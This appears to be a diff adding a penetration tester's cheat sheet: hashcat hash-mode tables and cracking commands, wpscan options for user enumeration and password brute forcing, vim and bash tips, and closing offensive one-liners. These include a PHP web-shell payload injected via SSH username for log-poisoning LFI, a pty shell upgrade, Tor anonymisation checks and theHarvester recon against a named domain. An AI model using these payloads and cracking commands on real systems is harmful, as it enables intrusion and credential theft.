+     22 | Juniper Netscreen/SSG (ScreenOS)                 | Operating-Systems
+    501 | Juniper IVE                                      | Operating-Systems
+   5800 | Android PIN                                      | Operating-Systems
+  13800 | Windows 8+ phone PIN/Password                    | Operating-Systems
+   8100 | Citrix Netscaler                                 | Operating-Systems
+   8500 | RACF                                             | Operating-Systems
+   7200 | GRUB 2                                           | Operating-Systems
+   9900 | Radmin2                                          | Operating-Systems
+    125 | ArubaOS                                          | Operating-Systems
+   7700 | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS)
+   7800 | SAP CODVN F/G (PASSCODE)                         | Enterprise Application Software (EAS)
+  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS)
+   8600 | Lotus Notes/Domino 5                             | Enterprise Application Software (EAS)
+   8700 | Lotus Notes/Domino 6                             | Enterprise Application Software (EAS)
+   9100 | Lotus Notes/Domino 8                             | Enterprise Application Software (EAS)
+    133 | PeopleSoft                                       | Enterprise Application Software (EAS)
+  13500 | PeopleSoft Token                                 | Enterprise Application Software (EAS)
+  11600 | 7-Zip                                            | Archives
+  12500 | RAR3-hp                                          | Archives
+  13000 | RAR5                                             | Archives
+  13200 | AxCrypt                                          | Archives
+  13300 | AxCrypt in memory SHA1                           | Archives
+  13600 | WinZip                                           | Archives
+   62XY | TrueCrypt                                        | Full-Disk encryptions (FDE)
+     X  | 1 = PBKDF2-HMAC-RipeMD160                        | Full-Disk encryptions (FDE)
+     X  | 2 = PBKDF2-HMAC-SHA512                           | Full-Disk encryptions (FDE)
+     X  | 3 = PBKDF2-HMAC-Whirlpool                        | Full-Disk encryptions (FDE)
+     X  | 4 = PBKDF2-HMAC-RipeMD160 + boot-mode            | Full-Disk encryptions (FDE)
+      Y | 1 = XTS  512 bit pure AES                        | Full-Disk encryptions (FDE)
+      Y | 1 = XTS  512 bit pure Serpent                    | Full-Disk encryptions (FDE)
+      Y | 1 = XTS  512 bit pure Twofish                    | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit pure AES                        | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit pure Serpent                    | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit pure Twofish                    | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit cascaded AES-Twofish            | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit cascaded Serpent-AES            | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk encryptions (FDE)
+      Y | 3 = XTS 1536 bit all                             | Full-Disk encryptions (FDE)
+   8800 | Android FDE < v4.3                               | Full-Disk encryptions (FDE)
+  12900 | Android FDE (Samsung DEK)                        | Full-Disk encryptions (FDE)
+  12200 | eCryptfs                                         | Full-Disk encryptions (FDE)
+  137XY | VeraCrypt                                        | Full-Disk encryptions (FDE)
+     X  | 1 = PBKDF2-HMAC-RipeMD160                        | Full-Disk encryptions (FDE)
+     X  | 2 = PBKDF2-HMAC-SHA512                           | Full-Disk encryptions (FDE)
+     X  | 3 = PBKDF2-HMAC-Whirlpool                        | Full-Disk encryptions (FDE)
+     X  | 4 = PBKDF2-HMAC-RipeMD160 + boot-mode            | Full-Disk encryptions (FDE)
+     X  | 5 = PBKDF2-HMAC-SHA256                           | Full-Disk encryptions (FDE)
+     X  | 6 = PBKDF2-HMAC-SHA256 + boot-mode               | Full-Disk encryptions (FDE)
+      Y | 1 = XTS  512 bit pure AES                        | Full-Disk encryptions (FDE)
+      Y | 1 = XTS  512 bit pure Serpent                    | Full-Disk encryptions (FDE)
+      Y | 1 = XTS  512 bit pure Twofish                    | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit pure AES                        | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit pure Serpent                    | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit pure Twofish                    | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit cascaded AES-Twofish            | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit cascaded Serpent-AES            | Full-Disk encryptions (FDE)
+      Y | 2 = XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk encryptions (FDE)
+      Y | 3 = XTS 1536 bit all                             | Full-Disk encryptions (FDE)
+   9700 | MS Office <= 2003 $0|$1, MD5 + RC4               | Documents
+   9710 | MS Office <= 2003 $0|$1, MD5 + RC4, collider #1  | Documents
+   9720 | MS Office <= 2003 $0|$1, MD5 + RC4, collider #2  | Documents
+   9800 | MS Office <= 2003 $3|$4, SHA1 + RC4              | Documents
+   9810 | MS Office <= 2003 $3|$4, SHA1 + RC4, collider #1 | Documents
+   9820 | MS Office <= 2003 $3|$4, SHA1 + RC4, collider #2 | Documents
+   9400 | MS Office 2007                                   | Documents
+   9500 | MS Office 2010                                   | Documents
+   9600 | MS Office 2013                                   | Documents
+  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents
+  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents
+  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents
+  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents
+  10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents
+  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents
+   9000 | Password Safe v2                                 | Password Managers
+   5200 | Password Safe v3                                 | Password Managers
+   6800 | Lastpass + Lastpass sniffed                      | Password Managers
+   6600 | 1Password, agilekeychain                         | Password Managers
+   8200 | 1Password, cloudkeychain                         | Password Managers
+  11300 | Bitcoin/Litecoin wallet.dat                      | Password Managers
+  12700 | Blockchain, My Wallet                            | Password Managers
+  13400 | Keepass 1 (AES/Twofish) and Keepass 2 (AES)      | Password Managers
+
+- [ Outfile Formats ] -
+
+  # | Format
+ ===+========
+  1 | hash[:salt]
+  2 | plain
+  3 | hash[:salt]:plain
+  4 | hex_plain
+  5 | hash[:salt]:hex_plain
+  6 | plain:hex_plain
+  7 | hash[:salt]:plain:hex_plain
+  8 | crackpos
+  9 | hash[:salt]:crack_pos
+ 10 | plain:crack_pos
+ 11 | hash[:salt]:plain:crack_pos
+ 12 | hex_plain:crack_pos
+ 13 | hash[:salt]:hex_plain:crack_pos
+ 14 | plain:hex_plain:crack_pos
+ 15 | hash[:salt]:plain:hex_plain:crack_pos
+
+- [ Rule Debugging Modes ] -
+
+  # | Format
+ ===+========
+  1 | Finding-Rule
+  2 | Original-Word
+  3 | Original-Word:Finding-Rule
+  4 | Original-Word:Finding-Rule:Processed-Word
+
+- [ Attack Modes ] -
+
+  # | Mode
+ ===+======
+  0 | Straight
+  1 | Combination
+  3 | Brute-force
+  6 | Hybrid Wordlist + Mask
+  7 | Hybrid Mask + Wordlist
+
+- [ Built-in Charsets ] -
+
+  ? | Charset
+ ===+=========
+  l | abcdefghijklmnopqrstuvwxyz
+  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+  d | 0123456789
+  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+  a | ?l?u?d?s
+  b | 0x00 - 0xff
+
+- [ OpenCL Device Types ] -
+
+  # | Device Type
+ ===+=============
+  1 | CPU
+  2 | GPU
+  3 | FPGA, DSP, Co-Processor
+
+- [ Workload Profiles ] -
+
+  # | Performance | Runtime | Power Consumption | Desktop Impact
+ ===+=============+=========+===================+=================
+  1 | Low         |   2 ms  | Low               | Minimal
+  2 | Default     |  12 ms  | Economic          | Noticeable
+  3 | High        |  96 ms  | High              | Unresponsive
+  4 | Nightmare   | 480 ms  | Insane            | Headless
+
+- [ Basic Examples ] -
+
+  Attack-          | Hash- |
+  Mode             | Type  | Example command
+ ==================+=======+==================================================================
+  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
+  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
+  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
+  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
+
+
+###############################################################################
+{RFC}
+###############################################################################
+
+OCTET          = <any 8-bit sequence of data>
+CHAR           = <any US-ASCII character (octets 0 - 127)>
+UPALPHA        = <any US-ASCII uppercase letter "A".."Z">
+LOALPHA        = <any US-ASCII lowercase letter "a".."z">
+ALPHA          = UPALPHA | LOALPHA
+DIGIT          = <any US-ASCII digit "0".."9">
+CTL            = <any US-ASCII control character
+                        (octets 0 - 31) and DEL (127)>
+CR             = <US-ASCII CR, carriage return (13)>
+LF             = <US-ASCII LF, linefeed (10)>
+SP             = <US-ASCII SP, space (32)>
+HT             = <US-ASCII HT, horizontal-tab (9)>
+<">            = <US-ASCII double-quote mark (34)>
+CRLF 		    = CR LF
+LWS            = [CRLF] 1*( SP | HT )
+TEXT           = <any OCTET except CTLs,
+                        but including LWS>
+token          = 1*<any CHAR except CTLs or separators>
+separators     = "(" | ")" | "<" | ">" | "@"
+                      | "," | ";" | ":" | "\" | <">
+                      | "/" | "[" | "]" | "?" | "="
+                      | "{" | "}" | SP | HT
+comment        = "(" *( ctext | quoted-pair | comment ) ")"
+ctext          = <any TEXT excluding "(" and ")">
+quoted-string  = ( <"> *(qdtext | quoted-pair ) <"> )
+qdtext         = <any TEXT except <">>
+quoted-pair    = "\" CHAR
+
+###############################################################################
+{vim}
+###############################################################################
+
+{ — Move to start of previous paragraph or code block.
+} — Move to end of next paragraph or code block.
+Ctrl+F — Move forward one screenful.
+Ctrl+B — Move backward one screenful.
+
+t<char> — Move forward until the next occurrence of the character.
+f<char> — Move forward over the next occurrence of the character.
+T<char> — Move backward until the previous occurrence of the character.
+F<char> — Move backward over the previous occurrence of the character.
+
+Moving wordwise with w, W, b, B, e, and E is better, too. Again, searching to navigate is good here, and don’t forget you can yank, delete or change forward or backward to a search result:
+
+y/search<Enter>
+y?search<Enter>
+d/search<Enter>
+d?search<Enter>
+c/search<Enter>
+c?search<Enter>
+
+Deleting, then inserting
+
+Deleting text with intent to replace it by entering insert mode immediately afterward isn’t necessary:
+
+d2wi
+It’s quicker and tidier to use c for change:
+
+c2w
+This has the added benefit of making the entire operation repeatable with the . command.
+
+###############################################################################
+{Python}
+###############################################################################
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+###############################################################################
+{bash}
+###############################################################################
+
+
+Run Command 5 Times
+
+for i in {1..5}; do COMMAND-HERE; done
+for((i=1;i<=10;i+=2)); do echo "Welcome $i times"; done
+for i in *; do echo $i; done
+for i in /etc/*.conf; do cp $i /backup; done
+
+###############################################################################
+{wpscan}
+###############################################################################
+
+--update                            Update the database to the latest version.
+--url       | -u <target url>       The WordPress URL/domain to scan.
+--force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
+--enumerate | -e [option(s)]        Enumeration.
+  option :
+    u        usernames from id 1 to 10
+    u[10-20] usernames from id 10 to 20 (you must write [] chars)
+    p        plugins
+    vp       only vulnerable plugins
+    ap       all plugins (can take a long time)
+    tt       timthumbs
+    t        themes
+    vt       only vulnerable themes
+    at       all themes (can take a long time)
+  Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
+  If no option is supplied, the default is "vt,tt,u,vp"
+
+--exclude-content-based "<regexp or string>"
+                                    Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
+                                    You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
+--config-file  | -c <config file>   Use the specified config file, see the example.conf.json.
+--user-agent   | -a <User-Agent>    Use the specified User-Agent.
+--cookie <string>                   String to read cookies from.
+--random-agent | -r                 Use a random User-Agent.
+--follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
+--batch                             Never ask for user input, use the default behaviour.
+--no-color                          Do not use colors in the output.
+--log                               Creates a log.txt file with WPScan's output.
+--no-banner                         Prevents the WPScan banner from being displayed.
+--disable-accept-header             Prevents WPScan sending the Accept HTTP header.
+--disable-referer                   Prevents setting the Referer header.
+--disable-tls-checks                Disables SSL/TLS certificate verification.
+--wp-content-dir <wp content dir>   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.
+                                    Subdirectories are allowed.
+--wp-plugins-dir <wp plugins dir>   Same thing than --wp-content-dir but for the plugins directory.
+                                    If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
+--proxy <[protocol://]host:port>    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.
+                                    If no protocol is given (format host:port), HTTP will be used.
+--proxy-auth <username:password>    Supply the proxy login credentials.
+--basic-auth <username:password>    Set the HTTP Basic authentication.
+--wordlist | -w <wordlist>          Supply a wordlist for the password brute forcer.
+--username | -U <username>          Only brute force the supplied username.
+--usernames     <path-to-file>      Only brute force the usernames from the file.
+--cache-dir       <cache-directory> Set the cache directory.
+--cache-ttl       <cache-ttl>       Typhoeus cache TTL.
+--request-timeout <request-timeout> Request Timeout.
+--connect-timeout <connect-timeout> Connect Timeout.
+--threads  | -t <number of threads> The number of threads to use when multi-threading requests.
+--max-threads     <max-threads>     Maximum Threads.
+--throttle        <milliseconds>    Milliseconds to wait before doing another web request. If used, the --threads should be set to 1.
+--help     | -h                     This help screen.
+--verbose  | -v                     Verbose output.
+###############################################################################
+
+
+
+
+
+###############################################################################
+curl --socks 127.0.0.1:9050 ifconfig.me/ip
+tor-resolve wp.pl
+
+proxychains4 curl ifconfig.me/ip
+
+SSH Log Poisoning via /var/log/auth.log for LFI: 
+brute@logic:~$ ssh '<?php echo system($_GET["cmd"]);exit;?>'@HOST
+
+theharvester -d christinelingerie.com -l 10 -b bing
+theharvester -d christinelingerie.com -l 10 -b google  (linkedin, PGP)
+
+###############################################################################
+
+
+###############################################################################
+
+###############################################################################
